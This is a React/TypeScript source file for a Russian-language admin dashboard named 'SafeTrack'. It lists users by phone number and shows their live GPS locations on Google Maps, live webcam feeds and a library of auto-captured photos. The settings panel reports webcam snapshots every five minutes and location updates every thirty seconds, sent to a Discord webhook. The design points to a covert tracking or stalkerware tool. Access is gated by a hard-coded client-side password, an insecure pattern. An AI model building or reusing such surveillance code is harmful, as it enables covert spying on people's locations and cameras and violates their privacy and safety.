import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Shield,
  MapPin,
  Users,
  Eye,
  Lock,
  Copy,
  Camera,
  Download,
  Settings,
  Image,
} from "lucide-react";
import { toast } from "@/hooks/use-toast";
import { getUsers, saveAdminSession } from "@/services/databaseService";
import { CameraControls } from "./CameraControls";
import { PhotoLibrary } from "./PhotoLibrary";
import type { User } from "@/services/databaseService";

const ADMIN_PASSWORD = "admin2025secure";

interface AdminPanelProps {
  onLogout: () => void;
}

export const AdminLogin: React.FC<{ onLogin: () => void }> = ({ onLogin }) => {
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    await new Promise((resolve) => setTimeout(resolve, 500));

    if (password === ADMIN_PASSWORD) {
      const sessionToken =
        Math.random().toString(36).substring(2) + Date.now().toString(36);
      await saveAdminSession(sessionToken);
      localStorage.setItem("admin_session_token", sessionToken);

      toast({
        title: "Доступ разрешен",
        description: "Добро пожаловать в панель мониторинга",
      });
      onLogin();
    } else {
      toast({
        title: "Доступ запрещен",
        description: "Неверный пароль администратора",
        variant: "destructive",
      });
    }

    setLoading(false);
    setPassword("");
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 flex items-center justify-center p-4">
      <Card className="w-full max-w-md border-slate-700 bg-slate-800">
        <CardHeader className="text-center">
          <div className="mx-auto mb-4 p-3 bg-slate-700 rounded-full w-fit">
            <Lock className="h-8 w-8 text-slate-300" />
          </div>
          <CardTitle className="text-2xl font-bold text-white">
            Админ доступ
          </CardTitle>
          <CardDescription className="text-slate-400">
            Введите пароль администратора для доступа к панели мониторинга
          </CardDescription>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleLogin} className="space-y-4">
            <div className="space-y-2">
              <label
                htmlFor="password"
                className="text-sm font-medium text-slate-300"
              >
                Пароль администратора
              </label>
              <Input
                id="password"
                type="password"
                placeholder="Введите пароль администратора"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="bg-slate-700 border-slate-600 text-white"
                required
              />
            </div>

            <Button
              type="submit"
              className="w-full bg-blue-600 hover:bg-blue-700"
              disabled={loading || !password}
              size="lg"
            >
              {loading ? "Проверка..." : "Войти в панель"}
            </Button>
          </form>
        </CardContent>
      </Card>
    </div>
  );
};

export const AdminPanel: React.FC<AdminPanelProps> = ({ onLogout }) => {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [activeTab, setActiveTab] = useState("overview");

  useEffect(() => {
    const fetchUsers = async () => {
      const result = await getUsers();
      if (result.error) {
        toast({
          title: "Ошибка загрузки",
          description: result.error,
          variant: "destructive",
        });
      } else {
        setUsers(result.users);
      }
      setLoading(false);
    };

    fetchUsers();

    // Обновляем каждые 10 секунд
    const interval = setInterval(fetchUsers, 10000);
    return () => clearInterval(interval);
  }, []);

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast({
        title: "Скопировано!",
        description: "Текст скопирован в буфер обмена",
      });
    } catch (error) {
      toast({
        title: "Ошибка",
        description: "Не удалось скопировать текст",
        variant: "destructive",
      });
    }
  };

  const openGoogleMaps = (lat: number, lng: number) => {
    const url = `https://www.google.com/maps?q=${lat},${lng}`;
    window.open(url, "_blank");
  };

  const getStatus = (user: User) => {
    if (!user.last_seen) return { status: "offline", text: "Неактивен" };

    const lastSeen = new Date(user.last_seen);
    const now = new Date();
    const diffMinutes = Math.floor(
      (now.getTime() - lastSeen.getTime()) / (1000 * 60),
    );

    if (diffMinutes < 2) return { status: "active", text: "Активен" };
    if (diffMinutes < 10)
      return { status: "idle", text: `${diffMinutes} мин назад` };
    return { status: "offline", text: "Неактивен" };
  };

  const activeUsers = users.filter((user) => {
    const status = getStatus(user);
    return status.status === "active";
  });

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-4">
      <div className="max-w-7xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex justify-between items-center">
          <div className="flex items-center space-x-3">
            <Shield className="h-8 w-8 text-blue-400" />
            <div>
              <h1 className="text-3xl font-bold text-white">
                Панель мониторинга SafeTrack
              </h1>
              <p className="text-slate-400">
                Система мониторинга веб-камер и местоположения в реальном
                времени
              </p>
            </div>
          </div>
          <Button
            onClick={onLogout}
            variant="outline"
            className="border-slate-600 text-slate-300"
          >
            Выйти
          </Button>
        </div>

        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
          <Card className="border-slate-700 bg-slate-800">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium text-slate-300">
                Активные сессии
              </CardTitle>
              <Users className="h-4 w-4 text-green-400" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-white">
                {activeUsers.length}
              </div>
              <p className="text-xs text-slate-400">Сейчас онлайн</p>
            </CardContent>
          </Card>

          <Card className="border-slate-700 bg-slate-800">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium text-slate-300">
                Всего пользователей
              </CardTitle>
              <MapPin className="h-4 w-4 text-blue-400" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-white">
                {users.length}
              </div>
              <p className="text-xs text-slate-400">Зарегистрировано</p>
            </CardContent>
          </Card>

          <Card className="border-slate-700 bg-slate-800">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium text-slate-300">
                Доступ к камере
              </CardTitle>
              <Eye className="h-4 w-4 text-purple-400" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-white">
                {users.filter((u) => u.consents?.camera).length}
              </div>
              <p className="text-xs text-slate-400">С веб-камерой</p>
            </CardContent>
          </Card>

          <Card className="border-slate-700 bg-slate-800">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium text-slate-300">
                Снимки экрана
              </CardTitle>
              <Camera className="h-4 w-4 text-orange-400" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-white">
                {users.filter((u) => u.consents?.camera).length * 12}
              </div>
              <p className="text-xs text-slate-400">Автозахваченных</p>
            </CardContent>
          </Card>
        </div>

        {/* Main Content Tabs */}
        <Tabs
          value={activeTab}
          onValueChange={setActiveTab}
          className="space-y-6"
        >
          <TabsList className="grid w-full grid-cols-4 bg-slate-800 border-slate-700">
            <TabsTrigger
              value="overview"
              className="text-slate-300 data-[state=active]:text-white"
            >
              Обзор
            </TabsTrigger>
            <TabsTrigger
              value="camera"
              className="text-slate-300 data-[state=active]:text-white"
            >
              Управление камерой
            </TabsTrigger>
            <TabsTrigger
              value="photos"
              className="text-slate-300 data-[state=active]:text-white"
            >
              Библиотека фото
            </TabsTrigger>
            <TabsTrigger
              value="settings"
              className="text-slate-300 data-[state=active]:text-white"
            >
              Настройки
            </TabsTrigger>
          </TabsList>

          {/* Overview Tab */}
          <TabsContent value="overview" className="space-y-6">
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <CardTitle className="text-white">
                  Активные пользователи
                </CardTitle>
                <CardDescription className="text-slate-400">
                  {loading
                    ? "Загрузка..."
                    : `${users.length} пользователей зарегистрировано`}
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-3 max-h-96 overflow-y-auto">
                  {users.length === 0 && !loading ? (
                    <div className="text-center text-slate-400 py-8">
                      Пользователи не найдены
                    </div>
                  ) : (
                    users.map((user) => {
                      const status = getStatus(user);

                      return (
                        <div
                          key={user.id}
                          className="p-4 border border-slate-700 rounded-lg bg-slate-750"
                        >
                          <div className="flex items-center justify-between mb-3">
                            <div className="space-y-1">
                              <p className="font-medium text-white">
                                {user.phone_number}
                              </p>
                              <p className="text-xs text-slate-400">
                                {user.location
                                  ? `${user.location.latitude.toFixed(4)}, ${user.location.longitude.toFixed(4)}`
                                  : "Нет данных о местоположении"}
                              </p>
                            </div>
                            <div className="text-right space-y-1">
                              <div
                                className={`text-xs px-2 py-1 rounded-full ${
                                  status.status === "active"
                                    ? "bg-green-900 text-green-300"
                                    : status.status === "idle"
                                      ? "bg-yellow-900 text-yellow-300"
                                      : "bg-gray-700 text-gray-300"
                                }`}
                              >
                                {status.text}
                              </div>
                            </div>
                          </div>

                          <div className="flex space-x-2">
                            {user.consents?.camera && (
                              <Button
                                onClick={() => {
                                  setSelectedUser(user);
                                  setActiveTab("camera");
                                }}
                                size="sm"
                                className="flex-1 bg-blue-600 hover:bg-blue-700"
                              >
                                <Eye className="h-3 w-3 mr-1" />
                                Прямой эфир
                              </Button>
                            )}

                            {user.location && (
                              <Button
                                onClick={() =>
                                  openGoogleMaps(
                                    user.location!.latitude,
                                    user.location!.longitude,
                                  )
                                }
                                size="sm"
                                variant="outline"
                                className="border-slate-600 text-slate-300"
                              >
                                <MapPin className="h-3 w-3 mr-1" />
                                Карта
                              </Button>
                            )}

                            <Button
                              onClick={() => copyToClipboard(user.phone_number)}
                              size="sm"
                              variant="outline"
                              className="border-slate-600 text-slate-300"
                            >
                              <Copy className="h-3 w-3" />
                            </Button>
                          </div>
                        </div>
                      );
                    })
                  )}
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Camera Control Tab */}
          <TabsContent value="camera" className="space-y-6">
            {selectedUser ? (
              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <h3 className="text-xl font-bold text-white">
                    Управление камерой - {selectedUser.phone_number}
                  </h3>
                  <Button
                    onClick={() => setSelectedUser(null)}
                    variant="outline"
                    className="border-slate-600 text-slate-300"
                  >
                    Выбрать другого пользователя
                  </Button>
                </div>
                <CameraControls
                  isAdmin={true}
                  users={users.map((user) => ({
                    id: user.id,
                    name: user.phone_number,
                    phone: user.phone_number,
                    isOnline: getStatus(user).status === "active",
                    lastSeen: user.last_seen
                      ? new Date(user.last_seen)
                      : new Date(),
                    hasCamera: user.consents?.camera || false,
                  }))}
                />
              </div>
            ) : (
              <Card className="border-slate-700 bg-slate-800">
                <CardContent className="pt-6">
                  <div className="text-center text-slate-400 py-8">
                    <Camera className="h-16 w-16 mx-auto mb-4 opacity-50" />
                    <p className="text-lg mb-4">
                      Выберите пользователя для управления камерой
                    </p>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 max-w-4xl mx-auto">
                      {users
                        .filter((u) => u.consents?.camera)
                        .map((user) => (
                          <Button
                            key={user.id}
                            onClick={() => setSelectedUser(user)}
                            variant="outline"
                            className="border-slate-600 text-slate-300 p-4 h-auto"
                          >
                            <div className="text-center">
                              <p className="font-medium">{user.phone_number}</p>
                              <p className="text-xs opacity-75">
                                {getStatus(user).text}
                              </p>
                            </div>
                          </Button>
                        ))}
                    </div>
                  </div>
                </CardContent>
              </Card>
            )}
          </TabsContent>

          {/* Photo Library Tab */}
          <TabsContent value="photos" className="space-y-6">
            <PhotoLibrary phoneNumber={selectedUser?.phone_number} />
          </TabsContent>

          {/* Settings Tab */}
          <TabsContent value="settings" className="space-y-6">
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <CardTitle className="text-white flex items-center space-x-2">
                  <Settings className="h-5 w-5" />
                  <span>Настройки системы</span>
                </CardTitle>
                <CardDescription className="text-slate-400">
                  Конфигурация системы мониторинга
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="p-4 bg-blue-900 bg-opacity-50 border border-blue-700 rounded-lg">
                  <h4 className="font-medium text-blue-300 mb-2">
                    Discord Webhook
                  </h4>
                  <p className="text-sm text-blue-200 mb-2">
                    Активный webhook: Captain Hook
                  </p>
                  <p className="text-xs text-blue-300 font-mono">
                    https://discord.com/api/webhooks/1341361105192222804/...
                  </p>
                </div>

                <div className="p-4 bg-green-900 bg-opacity-50 border border-green-700 rounded-lg">
                  <h4 className="font-medium text-green-300 mb-2">
                    Автоматический захват
                  </h4>
                  <p className="text-sm text-green-200">
                    ✅ Включен - снимки каждые 5 минут
                  </p>
                </div>

                <div className="p-4 bg-purple-900 bg-opacity-50 border border-purple-700 rounded-lg">
                  <h4 className="font-medium text-purple-300 mb-2">
                    Отслеживание местоположения
                  </h4>
                  <p className="text-sm text-purple-200">
                    ✅ Активно - обновления каждые 30 секунд
                  </p>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};
